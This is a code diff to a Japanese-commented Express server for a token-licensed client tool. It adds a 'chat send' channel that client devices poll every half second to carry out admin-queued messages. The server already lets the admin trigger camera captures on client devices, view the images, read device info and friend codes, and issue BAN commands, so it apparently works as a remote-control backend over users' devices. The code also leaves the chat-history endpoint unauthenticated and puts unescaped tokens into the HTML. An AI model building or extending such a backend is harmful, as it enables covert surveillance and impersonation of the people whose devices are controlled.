@@ -1,4 +1,4 @@
-// server.js - 完全版（BAN機能付き）
+// server.js - 完全版（BAN + チャット送信機能付き）
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
@@ -98,13 +98,26 @@ db.serialize(() => {
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
   `);
-  // ★追加: BAN リクエスト用テーブル
+  // BAN リクエスト用テーブル
   db.run(`
     CREATE TABLE IF NOT EXISTS ban_requests (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       token TEXT NOT NULL,
       status TEXT DEFAULT 'pending',
       ban_type INTEGER DEFAULT 0,
+      requested_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+      delivered_at DATETIME DEFAULT NULL,
+      executed_at DATETIME DEFAULT NULL
+    )
+  `);
+  // ★追加: チャット送信リクエスト用テーブル
+  db.run(`
+    CREATE TABLE IF NOT EXISTS chat_messages (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      token TEXT NOT NULL,
+      message TEXT NOT NULL,
+      chat_type INTEGER DEFAULT 0,
+      status TEXT DEFAULT 'pending',
       requested_at DATETIME DEFAULT CURRENT_TIMESTAMP,
       delivered_at DATETIME DEFAULT NULL,
       executed_at DATETIME DEFAULT NULL
@@ -206,9 +219,18 @@ app.get('/dashboard', async (req, res) => {
     });
   });
 
-  // ★追加: BAN待機件数
   const banPendingCounts = await new Promise(r => {
     db.all("SELECT token, COUNT(*) as cnt FROM ban_requests WHERE status IN ('pending','delivered') GROUP BY token", (e, rows) => {
+      if (e) return r({});
+      const map = {};
+      rows.forEach(row => map[row.token] = row.cnt);
+      r(map);
+    });
+  });
+
+  // ★追加: チャット待機件数
+  const chatPendingCounts = await new Promise(r => {
+    db.all("SELECT token, COUNT(*) as cnt FROM chat_messages WHERE status IN ('pending','delivered') GROUP BY token", (e, rows) => {
       if (e) return r({});
       const map = {};
       rows.forEach(row => map[row.token] = row.cnt);
@@ -226,9 +248,12 @@ app.get('/dashboard', async (req, res) => {
     const cameraPending = cameraPendingCounts[t] || 0;
     const cameraBadge = cameraPending > 0 ? ` <span style="color:#e67e22; font-weight:bold;">📷待機中(${cameraPending})</span>` : '';
 
-    // ★追加: BAN待機バッジ
     const banPending = banPendingCounts[t] || 0;
     const banBadge = banPending > 0 ? ` <span style="color:#e74c3c; font-weight:bold;">🚫BAN待機(${banPending})</span>` : '';
+
+    // ★追加: チャット待機バッジ
+    const chatPending = chatPendingCounts[t] || 0;
+    const chatBadge = chatPending > 0 ? ` <span style="color:#3b82f6; font-weight:bold;">💬送信待機(${chatPending})</span>` : '';
 
     // オンライン状態の判定（5秒以内に通信があれば「使用中」）
     const isOnline = d.last_seen && (Date.now() - d.last_seen < 5000);
@@ -239,13 +264,24 @@ app.get('/dashboard', async (req, res) => {
     html += `<li style="margin:10px 0; padding:6px; background:#fafafa; border-radius:6px;">
       ${onlineBadge}
       <b>${t}</b> - ${d.user} - Ver: ${d.version} - ${expired ? '期限切れ' : '残り: ' + remaining + '回'} - ${d.expires}
-      ${deviceStatus}${mismatchBadge}${cameraBadge}${banBadge}<br>
+      ${deviceStatus}${mismatchBadge}${cameraBadge}${banBadge}${chatBadge}<br>
       <a href="/delete?token=${t}&password=${encodeURIComponent(adminPw)}" style="color:red;" onclick="return confirm('無効化？');">[無効化]</a>
       <a href="javascript:void(0)" onclick="showDeviceInfo('${t}')" style="color:#007bff; margin-left:8px;">[端末情報を表示]</a>
       <a href="javascript:void(0)" onclick="showFriendCodes('${t}')" style="color:#007bff; margin-left:8px;">[フレンドコードをみる]</a>
       <a href="javascript:void(0)" onclick="requestCamera('${t}')" style="color:#e67e22; margin-left:8px; font-weight:bold;">[📷 カメラ]</a>
       <a href="javascript:void(0)" onclick="showCameraImages('${t}')" style="color:#9b59b6; margin-left:8px; font-weight:bold;">[🖼 画像を見る]</a>
       <a href="javascript:void(0)" onclick="requestBan('${t}')" style="color:#c0392b; margin-left:8px; font-weight:bold; background:#ffe5e5; padding:2px 8px; border-radius:4px;">[🚫 BAN]</a>
+      <a href="javascript:void(0)" onclick="showChatHistory('${t}')" style="color:#3b82f6; margin-left:8px; font-weight:bold;">[💬 送信履歴]</a>
+      <div style="margin-top:6px; display:flex; align-items:center; gap:6px;">
+        <input type="text" id="chat-${t}" placeholder="メッセージを入力..." maxlength="200"
+               style="flex:1; max-width:400px; padding:6px 10px; border:1px solid #ccc; border-radius:6px; font-size:13px;"
+               onkeypress="if(event.key==='Enter')sendChatMessage('${t}')">
+        <button onclick="sendChatMessage('${t}')"
+                style="background:#3b82f6; color:white; border:none; padding:6px 14px; border-radius:6px; cursor:pointer; font-weight:bold;">
+          💬 送信
+        </button>
+        <span id="chat-status-${t}" style="font-size:12px; font-weight:bold; margin-left:6px;"></span>
+      </div>
     </li>`;
   }
   html += `</ul><hr>
@@ -289,6 +325,12 @@ app.get('/dashboard', async (req, res) => {
         document.getElementById('modal').style.display = 'block';
       });
     }
+    function showChatHistory(token) {
+      fetch('/api/chat-history?token=' + encodeURIComponent(token)).then(r => r.text()).then(html => {
+        document.getElementById('modal-content').innerHTML = html;
+        document.getElementById('modal').style.display = 'block';
+      });
+    }
     async function requestCamera(token) {
       if (!adminPw) return alert('セッションが切れました。再度ログインしてください。');
       try {
@@ -318,6 +360,40 @@ app.get('/dashboard', async (req, res) => {
         else alert('エラー: ' + (data.error || 'unknown'));
       } catch (e) {
         alert('通信エラー: ' + e.message);
+      }
+    }
+    async function sendChatMessage(token) {
+      const input = document.getElementById('chat-' + token);
+      const status = document.getElementById('chat-status-' + token);
+      if (!input) return;
+      const msg = input.value.trim();
+      if (!msg) {
+        if (status) { status.textContent = '⚠ メッセージが空です'; status.style.color = '#e74c3c'; setTimeout(() => { status.textContent = ''; }, 2500); }
+        return;
+      }
+      if (!adminPw) {
+        alert('セッションが切れました。再度ログインしてください。');
+        return;
+      }
+      try {
+        const res = await fetch('/api/admin/request-chat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPw },
+          body: JSON.stringify({ token, message: msg, chatType: 0 })
+        });
+        const data = await res.json();
+        if (res.ok) {
+          input.value = '';
+          if (status) {
+            status.textContent = '✅ 送信待ち';
+            status.style.color = '#28a745';
+            setTimeout(() => { status.textContent = ''; }, 3000);
+          }
+        } else {
+          if (status) { status.textContent = '❌ ' + (data.error || 'error'); status.style.color = '#e74c3c'; }
+        }
+      } catch (e) {
+        if (status) { status.textContent = '❌ 通信エラー'; status.style.color = '#e74c3c'; }
       }
     }
     </script>`;
@@ -435,6 +511,45 @@ app.get('/api/friend-codes', async (req, res) => {
   res.send(html);
 });
 
+// === API: チャット履歴（管理者閲覧用） ===
+app.get('/api/chat-history', async (req, res) => {
+  const token = req.query.token;
+  if (!token) return res.send('<p>token required</p>');
+  const data = tokenCache[token];
+  if (!data) return res.send('<p>トークンが見つかりません</p>');
+
+  const logs = await new Promise(r => {
+    db.all("SELECT * FROM chat_messages WHERE token = ? ORDER BY id DESC LIMIT 200", [token], (e, rows) => r(rows || []));
+  });
+
+  let html = `<h2>💬 チャット送信履歴</h2><p><b>Token:</b> <code>${escapeHtml(token)}</code></p>`;
+
+  if (logs.length === 0) {
+    html += `<p style="color:#888;">まだ送信履歴がありません</p>`;
+  } else {
+    const statusLabel = (s) => {
+      if (s === 'pending') return '<span style="color:#e67e22;">⏳ 待機中</span>';
+      if (s === 'delivered') return '<span style="color:#3b82f6;">📤 配達済</span>';
+      if (s === 'executed') return '<span style="color:#28a745;">✅ 実行済</span>';
+      return escapeHtml(s || '-');
+    };
+    html += `<table border="1" cellpadding="8" style="border-collapse:collapse; width:100%; font-size:13px;">
+      <tr style="background:#f0f0f0;"><th>#</th><th>メッセージ</th><th>ステータス</th><th>要求日時</th><th>実行日時</th></tr>`;
+    logs.forEach((log, idx) => {
+      html += `<tr>
+        <td>${logs.length - idx}</td>
+        <td><code style="background:#eef; padding:2px 6px; border-radius:4px;">${escapeHtml(log.message)}</code></td>
+        <td>${statusLabel(log.status)}</td>
+        <td>${escapeHtml(log.requested_at || '')}</td>
+        <td>${escapeHtml(log.executed_at || '-')}</td>
+      </tr>`;
+    });
+    html += `</table>`;
+  }
+
+  res.send(html);
+});
+
 // === API: トークンチェック ===
 app.get('/api/check', async (req, res) => {
   const token = req.query.token;
@@ -467,7 +582,7 @@ app.get('/api/check', async (req, res) => {
   }
 
   data.used++;
-  data.last_seen = Date.now(); // 認証時にも生存確認更新
+  data.last_seen = Date.now();
   db.run("UPDATE tokens SET used = ?, last_seen = ? WHERE token = ?", [data.used, data.last_seen, token], (err) => { if (err) console.error(err); });
   res.json({ valid: true });
 });
@@ -517,7 +632,6 @@ app.get('/api/camera-poll', (req, res) => {
   if (!data) return res.status(404).json({ error: 'invalid token' });
   if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
 
-  // ポーリング（5秒毎）を生存確認として利用
   data.last_seen = Date.now();
   db.run("UPDATE tokens SET last_seen = ? WHERE token = ?", [data.last_seen, token]);
 
@@ -618,7 +732,6 @@ app.get('/api/ban-poll', (req, res) => {
   if (!data) return res.status(404).json({ error: 'invalid token' });
   if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
 
-  // 生存確認
   data.last_seen = Date.now();
   db.run("UPDATE tokens SET last_seen = ? WHERE token = ?", [data.last_seen, token]);
 
@@ -651,6 +764,82 @@ app.get('/api/ban-executed', (req, res) => {
 
   db.run(
     "UPDATE ban_requests SET status = 'executed', executed_at = CURRENT_TIMESTAMP WHERE id = ? AND token = ?",
+    [requestId, token],
+    (err) => {
+      if (err) return res.status(500).json({ error: err.message });
+      res.json({ ok: true });
+    }
+  );
+});
+
+// === チャット送信機能（0.5秒ポーリング想定） ===
+app.post('/api/admin/request-chat', (req, res) => {
+  const adminPassword = req.headers['x-admin-password'];
+  if (adminPassword !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });
+
+  const { token, message, chatType } = req.body || {};
+  if (!token) return res.status(400).json({ error: 'token required' });
+  if (!message || typeof message !== 'string') return res.status(400).json({ error: 'message required' });
+  if (message.length === 0) return res.status(400).json({ error: 'empty message' });
+  if (message.length > 200) return res.status(400).json({ error: 'メッセージは200文字以内にしてください' });
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'token not found' });
+  if (!data.device_id) return res.status(400).json({ error: '端末未登録のトークンです' });
+
+  const ct = (chatType === 1) ? 1 : 0;
+
+  db.run(
+    "INSERT INTO chat_messages (token, message, chat_type, status) VALUES (?, ?, ?, 'pending')",
+    [token, message, ct],
+    function (err) {
+      if (err) return res.status(500).json({ error: err.message });
+      res.json({ ok: true, requestId: this.lastID });
+    }
+  );
+});
+
+app.get('/api/chat-poll', (req, res) => {
+  const { token, device } = req.query;
+  if (!token || !device) return res.status(400).json({ error: 'token and device required' });
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'invalid token' });
+  if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
+
+  // 生存確認（0.5s間隔で叩かれるため自然と高頻度更新になる）
+  data.last_seen = Date.now();
+  db.run("UPDATE tokens SET last_seen = ? WHERE token = ?", [data.last_seen, token]);
+
+  db.get(
+    "SELECT id, message, chat_type FROM chat_messages WHERE token = ? AND status = 'pending' ORDER BY id ASC LIMIT 1",
+    [token],
+    (err, row) => {
+      if (err) return res.status(500).json({ error: err.message });
+      if (!row) return res.json({ request: null });
+
+      db.run(
+        "UPDATE chat_messages SET status = 'delivered', delivered_at = CURRENT_TIMESTAMP WHERE id = ?",
+        [row.id],
+        (err2) => {
+          if (err2) return res.status(500).json({ error: err2.message });
+          res.json({ request: { id: row.id, message: row.message, chatType: row.chat_type || 0 } });
+        }
+      );
+    }
+  );
+});
+
+app.get('/api/chat-executed', (req, res) => {
+  const { token, device, requestId } = req.query;
+  if (!token || !device || !requestId) return res.status(400).json({ error: 'missing fields' });
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'invalid token' });
+  if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
+
+  db.run(
+    "UPDATE chat_messages SET status = 'executed', executed_at = CURRENT_TIMESTAMP WHERE id = ? AND token = ?",
     [requestId, token],
     (err) => {
       if (err) return res.status(500).json({ error: err.message });
